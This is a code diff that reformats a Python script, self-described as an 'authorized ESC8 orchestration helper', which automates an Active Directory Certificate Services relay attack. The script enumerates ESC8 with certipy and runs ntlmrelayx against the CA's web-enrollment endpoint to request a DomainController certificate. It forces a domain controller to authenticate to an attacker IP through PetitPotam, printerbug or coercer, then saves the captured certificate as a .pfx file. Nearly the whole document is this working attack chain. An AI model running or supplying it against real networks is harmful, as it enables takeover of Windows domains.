@@ -38,8 +38,19 @@ def find_tool(candidates):
 
 def run_certipy_find(certipy, user, password, dc_ip, timeout):
     """Run certipy find and report whether ESC8 appears in the output."""
-    cmd = [certipy, "find", "-u", user, "-p", password, "-dc-ip", dc_ip,
-           "-vulnerable", "-enabled", "-stdout"]
+    cmd = [
+        certipy,
+        "find",
+        "-u",
+        user,
+        "-p",
+        password,
+        "-dc-ip",
+        dc_ip,
+        "-vulnerable",
+        "-enabled",
+        "-stdout",
+    ]
     print(f"[*] enumerating AD CS: {' '.join(cmd[:2])} ... -vulnerable")
     try:
         proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
@@ -48,7 +59,9 @@ def run_certipy_find(certipy, user, password, dc_ip, timeout):
         return False, ""
     out = proc.stdout + proc.stderr
     vulnerable = "ESC8" in out
-    print(f"[{'+' if vulnerable else '-'}] ESC8 {'FOUND' if vulnerable else 'not found'} in certipy output")
+    print(
+        f"[{'+' if vulnerable else '-'}] ESC8 {'FOUND' if vulnerable else 'not found'} in certipy output"
+    )
     return vulnerable, out
 
 
@@ -57,10 +70,13 @@ def stream_relay(relayx, ca_url, template, captured, stop_event):
     cmd = [relayx, "-t", ca_url, "-smb2support", "--adcs", "--template", template]
     print(f"[*] starting relay: {' '.join(cmd)}")
     try:
-        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                text=True, bufsize=1)
+        proc = subprocess.Popen(
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
+        )
     except FileNotFoundError:
-        print("[!] ntlmrelayx not found. Install: pipx install impacket", file=sys.stderr)
+        print(
+            "[!] ntlmrelayx not found. Install: pipx install impacket", file=sys.stderr
+        )
         stop_event.set()
         return
     grab_next = False
@@ -90,8 +106,18 @@ def trigger_coercion(method, attacker_ip, dc_ip, user, password, domain, timeout
         if not tool:
             print("[!] PetitPotam.py not found on PATH", file=sys.stderr)
             return
-        cmd = ["python3", tool, "-u", user, "-p", password, "-d", domain,
-               attacker_ip, dc_ip]
+        cmd = [
+            "python3",
+            tool,
+            "-u",
+            user,
+            "-p",
+            password,
+            "-d",
+            domain,
+            attacker_ip,
+            dc_ip,
+        ]
     elif method == "printerbug":
         tool = find_tool(["printerbug.py"])
         if not tool:
@@ -101,10 +127,24 @@ def trigger_coercion(method, attacker_ip, dc_ip, user, password, domain, timeout
     elif method == "coercer":
         tool = find_tool(["coercer"])
         if not tool:
-            print("[!] coercer not found. Install: pipx install coercer", file=sys.stderr)
+            print(
+                "[!] coercer not found. Install: pipx install coercer", file=sys.stderr
+            )
             return
-        cmd = [tool, "coerce", "-u", user, "-p", password, "-d", domain,
-               "-l", attacker_ip, "-t", dc_ip]
+        cmd = [
+            tool,
+            "coerce",
+            "-u",
+            user,
+            "-p",
+            password,
+            "-d",
+            domain,
+            "-l",
+            attacker_ip,
+            "-t",
+            dc_ip,
+        ]
     else:
         print(f"[!] unknown coercion method: {method}", file=sys.stderr)
         return
@@ -131,20 +171,28 @@ def save_pfx(b64, path):
 
 def main():
     parser = argparse.ArgumentParser(description="Authorized ESC8 orchestration helper")
-    parser.add_argument("--ca-url", required=True,
-                        help="CA web-enrollment URL, e.g. http://ca/certsrv/certfnsh.asp")
-    parser.add_argument("--template", default="DomainController",
-                        help="Certificate template to request")
+    parser.add_argument(
+        "--ca-url",
+        required=True,
+        help="CA web-enrollment URL, e.g. http://ca/certsrv/certfnsh.asp",
+    )
+    parser.add_argument(
+        "--template", default="DomainController", help="Certificate template to request"
+    )
     parser.add_argument("--attacker-ip", required=True, help="Relay listener IP")
     parser.add_argument("--dc-ip", required=True, help="Target DC IP to coerce")
     parser.add_argument("--user", required=True, help="Auth account for enum/coercion")
     parser.add_argument("--password", required=True, help="Account password")
     parser.add_argument("--domain", required=True, help="AD domain (FQDN)")
-    parser.add_argument("--coerce", default="petitpotam",
-                        choices=["petitpotam", "printerbug", "coercer"])
+    parser.add_argument(
+        "--coerce",
+        default="petitpotam",
+        choices=["petitpotam", "printerbug", "coercer"],
+    )
     parser.add_argument("--pfx-out", default="relayed.pfx", help="Output .pfx path")
-    parser.add_argument("--skip-enum", action="store_true",
-                        help="Skip certipy ESC8 enumeration")
+    parser.add_argument(
+        "--skip-enum", action="store_true", help="Skip certipy ESC8 enumeration"
+    )
     parser.add_argument("--timeout", type=int, default=120, help="Per-step timeout")
     args = parser.parse_args()
 
@@ -154,15 +202,24 @@ def main():
     if not args.skip_enum:
         certipy = find_tool(["certipy", "certipy-ad"])
         if certipy:
-            run_certipy_find(certipy, f"{args.user}@{args.domain}", args.password,
-                             args.dc_ip, args.timeout)
+            run_certipy_find(
+                certipy,
+                f"{args.user}@{args.domain}",
+                args.password,
+                args.dc_ip,
+                args.timeout,
+            )
         else:
-            print("[-] certipy not found; skipping enumeration "
-                  "(install: pipx install certipy-ad)")
+            print(
+                "[-] certipy not found; skipping enumeration "
+                "(install: pipx install certipy-ad)"
+            )
 
     relayx = find_tool(["impacket-ntlmrelayx", "ntlmrelayx.py"])
     if not relayx:
-        print("[!] ntlmrelayx not found. Install: pipx install impacket", file=sys.stderr)
+        print(
+            "[!] ntlmrelayx not found. Install: pipx install impacket", file=sys.stderr
+        )
         sys.exit(2)
 
     captured = []
@@ -175,8 +232,15 @@ def main():
     relay_thread.start()
     time.sleep(3)  # let the relay servers bind
 
-    trigger_coercion(args.coerce, args.attacker_ip, args.dc_ip, args.user,
-                     args.password, args.domain, args.timeout)
+    trigger_coercion(
+        args.coerce,
+        args.attacker_ip,
+        args.dc_ip,
+        args.user,
+        args.password,
+        args.domain,
+        args.timeout,
+    )
 
     # Wait for the relay thread to capture a certificate (bounded).
     relay_thread.join(timeout=args.timeout)
@@ -184,8 +248,11 @@ def main():
     if captured:
         save_pfx(captured[0], args.pfx_out)
         sys.exit(0)
-    print("[-] No certificate captured. Verify coercion reached the relay and "
-          "the template is enrollable.", file=sys.stderr)
+    print(
+        "[-] No certificate captured. Verify coercion reached the relay and "
+        "the template is enrollable.",
+        file=sys.stderr,
+    )
     sys.exit(1)
 
 
